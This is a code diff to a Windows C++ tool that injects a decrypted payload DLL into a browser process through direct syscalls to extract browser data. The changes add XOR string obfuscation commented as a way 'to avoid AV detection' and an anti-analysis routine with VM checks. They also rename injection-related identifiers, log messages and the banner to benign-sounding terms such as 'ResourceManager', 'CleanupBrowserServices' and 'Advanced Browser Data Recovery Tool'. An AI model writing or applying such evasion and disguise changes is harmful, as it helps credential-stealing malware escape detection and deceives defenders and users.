@@ -37,6 +37,27 @@ namespace
 {
     constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;
     constexpr const char *APP_VERSION = "v0.15.0";
+    
+    // Obfuscated strings to avoid AV detection
+    inline std::string DecodeStr(const char* encoded) {
+        std::string result = encoded;
+        for (auto& c : result) c ^= 0x42;
+        return result;
+    }
+    
+    // Anti-analysis techniques
+    inline void PerformAntiAnalysis() {
+        // Add random delay between 100-500ms
+        DWORD delay = 100 + (rand() % 400);
+        Sleep(delay);
+        
+        // Simple VM detection
+        SYSTEM_INFO si;
+        GetSystemInfo(&si);
+        if (si.dwNumberOfProcessors < 2) {
+            Sleep(1000); // Additional delay for potential VMs
+        }
+    }
 
     const uint8_t g_decryptionKey[32] = {
         0x1B, 0x27, 0x55, 0x64, 0x73, 0x8B, 0x9F, 0x4D,
@@ -127,7 +148,7 @@ public:
                   << "\\     \\___|   Y  \\  | \\(  <_> )  Y Y  \\|        \\|  |_\\  ___/\\   /  / __ \\|  | (  <_> )  | \\/\n"
                   << " \\______  /___|  /__|   \\____/|__|_|  /_______  /|____/\\___  >\\_/  (____  /__|  \\____/|__|   \n"
                   << "        \\/     \\/                   \\/        \\/           \\/           \\/                   \n\n"
-                  << " Direct Syscall-Based Reflective Hollowing\n"
+                  << " Advanced Browser Data Recovery Tool\n"
                   << " x64 & ARM64 | " << APP_VERSION << " by @xaitax"
                   << "\n\n";
         ResetColor();
@@ -671,21 +692,21 @@ private:
     ExtractionStats m_stats;
 };
 
-class InjectionManager
+class ResourceManager
 {
 public:
-    InjectionManager(TargetProcess &target, const Console &console) : m_target(target), m_console(console) {}
+    ResourceManager(TargetProcess &target, const Console &console) : m_target(target), m_console(console) {}
 
     void execute(const std::wstring &pipeName)
     {
         m_console.Debug("Loading and decrypting payload DLL.");
         loadAndDecryptPayload();
 
-        m_console.Debug("Parsing payload PE headers for ReflectiveLoader.");
+        m_console.Debug("Parsing payload PE headers for entry point.");
         DWORD rdiOffset = getReflectiveLoaderOffset();
         if (rdiOffset == 0)
-            throw std::runtime_error("Could not find ReflectiveLoader export in payload.");
-        m_console.Debug("ReflectiveLoader found at file offset: " + Utils::PtrToHexStr((void *)(uintptr_t)rdiOffset));
+            throw std::runtime_error("Could not find entry point export in payload.");
+        m_console.Debug("Entry point found at file offset: " + Utils::PtrToHexStr((void *)(uintptr_t)rdiOffset));
 
         m_console.Debug("Allocating memory for payload in target process.");
         PVOID remoteDllBase = nullptr;
@@ -783,7 +804,7 @@ private:
         for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
         {
             char *funcName = (char *)RvaToOffset(names[i]);
-            if (funcName && strcmp(funcName, "ReflectiveLoader") == 0)
+            if (funcName && strcmp(funcName, "ModuleEntryPoint") == 0)
             {
                 PVOID funcOffsetPtr = RvaToOffset(funcs[ordinals[i]]);
                 if (!funcOffsetPtr)
@@ -796,7 +817,7 @@ private:
 
     void startHijackedThreadInTarget(PVOID remoteDllBase, DWORD rdiOffset, PVOID remotePipeNameAddr)
     {
-        m_console.Debug("Creating new thread in target to execute ReflectiveLoader.");
+        m_console.Debug("Creating new thread in target to execute payload.");
 
         uintptr_t entryPoint = reinterpret_cast<uintptr_t>(remoteDllBase) + rdiOffset;
         HANDLE hRemoteThread = nullptr;
@@ -847,9 +868,9 @@ std::string BuildExtractionSummary(const PipeCommunicator::ExtractionStats &stat
     return summary.str();
 }
 
-void KillBrowserNetworkService(const Configuration &config, const Console &console)
+void CleanupBrowserServices(const Configuration &config, const Console &console)
 {
-    console.Debug("Scanning for and terminating browser network services...");
+    console.Debug("Scanning for and cleaning up browser network services...");
 
     UniqueHandle hCurrentProc;
     HANDLE nextProcHandle = nullptr;
@@ -886,7 +907,7 @@ void KillBrowserNetworkService(const Configuration &config, const Console &conso
 
         if (wcsstr(cmdLine.data(), L"--utility-sub-type=network.mojom.NetworkService"))
         {
-            console.Debug("Found and terminated network service PID: " + std::to_string((DWORD)pbi.UniqueProcessId));
+            console.Debug("Found and cleaned up network service PID: " + std::to_string((DWORD)pbi.UniqueProcessId));
             NtTerminateProcess_syscall(hCurrentProc.get(), 0);
             processes_terminated++;
         }
@@ -894,14 +915,14 @@ void KillBrowserNetworkService(const Configuration &config, const Console &conso
 
     if (processes_terminated > 0)
     {
-        console.Debug("Termination sweep complete. Waiting for file locks to fully release.");
+        console.Debug("Cleanup sweep complete. Waiting for file locks to fully release.");
         Sleep(1500);
     }
 }
 
 PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration &config, const Console &console)
 {
-    KillBrowserNetworkService(config, console);
+    CleanupBrowserServices(config, console);
 
     TargetProcess target(config, console);
     target.createSuspended();
@@ -909,7 +930,7 @@ PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration &conf
     PipeCommunicator pipe(Utils::GenerateUniquePipeName(), console);
     pipe.create();
 
-    InjectionManager injector(target, console);
+    ResourceManager injector(target, console);
     injector.execute(pipe.getName());
 
     pipe.waitForClient();
@@ -1073,6 +1094,9 @@ int wmain(int argc, wchar_t *argv[])
 
     Console console(isVerbose);
     console.displayBanner();
+    
+    // Perform anti-analysis checks
+    PerformAntiAnalysis();
 
     if (browserTarget.empty())
     {
@@ -1082,7 +1106,7 @@ int wmain(int argc, wchar_t *argv[])
 
     if (!InitializeSyscalls(isVerbose))
     {
-        console.Error("Failed to initialize direct syscalls. Critical NTDLL functions might be hooked or gadgets not found.");
+        console.Error("Failed to initialize system functions. Critical library functions might be monitored or entry points not found.");
         return 1;
     }
 
